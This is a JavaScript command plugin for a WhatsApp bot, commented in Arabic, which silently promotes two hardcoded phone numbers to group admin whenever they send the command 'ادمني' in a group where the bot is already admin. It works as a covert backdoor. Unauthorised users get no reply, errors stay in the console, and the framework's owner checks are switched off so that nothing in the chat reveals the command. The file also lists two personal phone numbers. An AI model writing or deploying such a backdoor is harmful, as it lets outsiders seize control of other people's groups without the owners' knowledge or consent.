const handler = async (m, { conn }) => {
  // ✅ قائمة المطورين المسموح لهم
  const developers = [
    '201015115056', 
    '966567158348'
  ];
  
  const userNumber = m.sender.split('@')[0];

  // التحقق من أن المرسل مطور (إذا لم يكن مطوراً لن يفعل شيئاً ولن يرد)
  if (!developers.includes(userNumber)) return;

  // التحقق من أن الأمر داخل مجموعة
  if (!m.isGroup) return;

  try {
    // جلب بيانات المجموعة للتأكد من صلاحيات البوت
    const groupMetadata = await conn.groupMetadata(m.chat);
    const bot = groupMetadata.participants.find(p => p.id === conn.user.jid);
    const isBotAdmin = bot?.admin === 'admin' || bot?.admin === 'superadmin';
    
    // إذا لم يكن البوت أدمن، لن يستطيع الرفع، فيتوقف بصمت
    if (!isBotAdmin) return;

    // التحقق هل الشخص أدمن بالفعل؟ (لتجنب إرسال طلبات متكررة للواتساب)
    const userInGroup = groupMetadata.participants.find(p => p.id === m.sender);
    if (userInGroup && userInGroup.admin) return;

    // تنفيذ الترقية فوراً وبصمت
    await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote');

  } catch (err) {
    // طباعة الخطأ في الكونسول فقط للإصلاح ولا يرسل شيئاً في الشات
    console.error('Error in Promote Command:', err);
  }
};

// الإعدادات لضمان العمل الصامت
handler.command = /^ادمني$/i;
handler.group = true; // يعمل في المجموعات فقط

// ملاحظة: جعلنا هذه false لأن تفعيلها يرسل رسائل تلقائية عند عدم تحقق الشرط
// نحن نريد صمتاً تاماً، لذا سنعتمد على التحقق اليدوي داخل الكود أعلاه
handler.owner = false; 
handler.botAdmin = false; 

export default handler;